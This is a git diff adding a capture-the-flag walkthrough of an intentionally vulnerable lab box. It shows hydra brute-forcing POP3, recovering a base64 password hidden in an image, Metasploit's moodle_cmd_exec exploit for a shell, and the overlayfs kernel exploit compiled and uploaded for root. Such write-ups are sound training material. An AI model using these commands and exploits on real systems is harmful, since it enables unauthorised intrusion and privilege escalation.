@@ -74,12 +74,154 @@ Ignored the fourth message ;D here is my finding that could gave me hints on the
 
 >Server directory: /gnocertdir
 
-From the information above i need to point out my ip in the **/etc/hosts** configuration file so that i can use the internal server and direct to server directory mention above.
+From the information above i need to point out my ip (adding domain name) in the **/etc/hosts** configuration file so that i can use the internal server and direct to server directory mention above.
 
 <img src="Images/11.JPG" width="500px">
 
 Woala, its moodle cms. This could lead to something. Lets login with the credential captured in **natalya** message. 
 
 <img src="Images/12.JPG" width="500px">
+
+Now on further digging , exploring all the side tabs on the page. I discovered a message between Xenia and **"Doak"** inside a message box ; perhaps a _(new user)_
+
+<img src="Images/13.JPG" width="500px">
+
+Ok lets fire up hydra and brute force this user to fetch the password!
+
+1. hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 192.168.0.162 -s 55007 pop3
+
+Bingo! the password for **doak** is **goat**. Now further reading the message, i acquired a username and password.
+
+> Username: dr_doak
+> Password: 4England!
+
+<img src="Images/14.JPG" width="500px">
+
+Using the credentials i went back to the domain login page. It wont take me long to noticing **my private files** in the navigation section of the page and I saw a **s3cret.txt** file in it.
+
+<img src="Images/15.JPG" width="500px">
+
+Inspecting the .txt file, It gave me the path for jpg image.
+
+<img src="Images/16.JPG" width="500px">
+
+Going to that path directory, I got this image!
+
+<img src="Images/17.JPG" width="500px">
+
+It took me a while (a whole day :D) to realize this .jpg image is really a "s3cret" thanks to **@mucomplex** for pointing it.
+
+1. wget http://severnaya-station.com/dir007key/for-007.jpg
+2. strings for-007.jpg
+
+<img src="Images/18.JPG" width="500px">
+
+A base64 encoded line, lets check its
+
+1. echo eFdpbnRlcjE5OTV4IQ== | base64 -day
+
+revealed me a password **xWinter1995x!**. Trying this password with admin user, took me to administrator page. At this moment, i run metasploit console and search for moodle modules and found a single module in my kali machine. 
+
+<img src="Images/19.JPG" width="500px">
+
+This could be used to popping a shell from the target **:D**. Setting up the module and run the exploit. However it doesnt work,hahaha.
+
+<img src="Images/20.JPG" width="500px">
+
+Looking into the source code of the module i found **TinyMCE HTML editor** and with the help of google. I found a plugin exactly like this one and i changed **Spell** engine to **PSpellShell** and saved the changes made.
+
+<img src="Images/21.JPG" width="500px">
+
+Now its time to run the metasploit again with the help of this command
+
+1.use exploit/multi/http/moodle_cmd_exec
+2.msf exploit(moodle_cmd_exec) > set rhost severnaya-station.com
+3.msf exploit(moodle_cmd_exec) > set targeturi /gnocertdir
+4.msf exploit(moodle_cmd_exec) > set username admin
+5.msf exploit(moodle_cmd_exec) > set password xWinter1995x!
+
+<img src="Images/22.JPG" width="500px">
+
+yeahh!! now i succesfully got a command shell session 1. As i love the meterpreter session, so i upgrade it into meterpreter shell.
+
+**session -u 1**
+
+Using sysinfo, i enumerated its kernel and focused on Linux 3.13 and if u familiar with the kernel u will find post exploit for  Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – **‘overlayfs‘**
+Local Priv Escalation
+
+<img src="Images/23.JPG" height= "200px" width="500px"><img src="Images/24.JPG" height= "200px" width="500px">
+
+**searchsploit linux 3.13**
+
+with the hellp of gcc i compile it as shell inside /root directory. Then upload the compiled shell file into victim's machine via meterpreter and run it. However, i got an error !!!!
+
+<img src="Images/25.JPG" width="500px">
+
+I saw an error message stated that gcc compiler is not currently installed. So to solve this i find alternative program to gcc and found cc as alternative of it.
+
+By making change into the original file 37292.c on line 143, i replaced gcc to cc and compiled it again with cc.
+
+> cc 37292.c -o ayam
+
+Upload it with meterpreter
+
+> upload /root/ayam
+> shell
+> chmod 777 ayam
+> ayam
+
+<img src="Images/26.JPG" width="500px">
+
+Booom!!! i got root access succesfully
+
+Now lets finish this task by capturing flag in the root /directory
+
+<img src="Images/27.JPG" width="500px">
+
+directing to that link, i got this web page **:D**
+
+###MREIAZ
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
